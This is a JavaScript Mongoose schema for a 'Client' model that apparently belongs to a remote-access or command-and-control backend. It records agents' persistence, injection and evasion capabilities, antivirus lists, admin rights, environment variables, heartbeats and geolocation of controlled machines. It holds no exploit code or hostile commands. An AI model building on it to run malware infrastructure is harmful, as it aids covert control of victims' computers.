const mongoose = require('mongoose');

const clientSchema = new mongoose.Schema({
    uuid: {
        type: String,
        required: true,
        unique: true,
    },
    computerName: {
        type: String,
        required: true,
    },
    ipAddress: {
        type: String,
        required: true,
    },
    country: {
        type: String,
        default: 'Unknown',
    },
    // Enhanced geolocation information
    geoLocation: {
        country: String,
        countryCode: String,
        region: String,
        regionName: String,
        city: String,
        zip: String,
        latitude: Number,
        longitude: Number,
        timezone: String,
        isp: String,
        organization: String,
        asn: String,
        isPrivate: Boolean,
        lastUpdated: {
            type: Date,
            default: Date.now
        }
    },
    hostname: {
        type: String,
    },
    platform: {
        type: String,
    },
    // Enhanced platform-specific fields
    operatingSystem: {
        type: String,
        enum: ['windows', 'linux', 'macos', 'android', 'ios', 'unknown'],
        default: 'unknown',
    },
    osVersion: {
        type: String,
        default: 'Unknown',
    },
    architecture: {
        type: String,
        enum: ['x86', 'x64', 'arm', 'arm64', 'unknown'],
        default: 'unknown',
    },
    // Agent capabilities
    capabilities: {
        persistence: {
            type: [String],
            default: [],
        },
        injection: {
            type: [String],
            default: [],
        },
        evasion: {
            type: [String],
            default: [],
        },
        commands: {
            type: [String],
            default: [],
        },
        features: {
            type: [String],
            default: [],
        },
    },
    // Authentication and security
    authToken: {
        type: String,
        default: '',
    },
    lastHeartbeat: {
        type: Date,
        default: Date.now,
    },
    connectionCount: {
        type: Number,
        default: 0,
    },
    // System information
    systemInfo: {
        username: String,
        domain: String,
        isAdmin: Boolean,
        antivirus: [String],
        processes: Number,
        uptime: Number,
        memory: {
            total: Number,
            available: Number,
        },
        disk: {
            total: Number,
            free: Number,
        },
        // Enhanced system timing and details
        bootTime: Date,
        localTime: Date,
        timeZone: String,
        systemLocale: String,
        cpuInfo: {
            model: String,
            cores: Number,
            speed: Number
        },
        networkInterfaces: [{
            name: String,
            ip: String,
            mac: String,
            type: String
        }],
        installedSoftware: [String],
        runningServices: [String],
        environmentVariables: Object,
        systemMetrics: {
            cpuUsage: Number,
            memoryUsage: Number,
            diskUsage: Number,
            networkActivity: {
                bytesReceived: Number,
                bytesSent: Number
            }
        }
    },
    lastActiveTime: {
        type: Date,
        default: Date.now,
    },
    additionalSystemDetails: {
        type: String,
        default: '',
    },
    status: {
        type: String,
        enum: ['online', 'offline'],
        default: 'offline',
    },
    // Keep legacy fields for backward compatibility
    ip: {
        type: String,
    },
    lastSeen: {
        type: Date,
    },
}, {
    timestamps: true,
});

const Client = mongoose.model('Client', clientSchema);

module.exports = Client;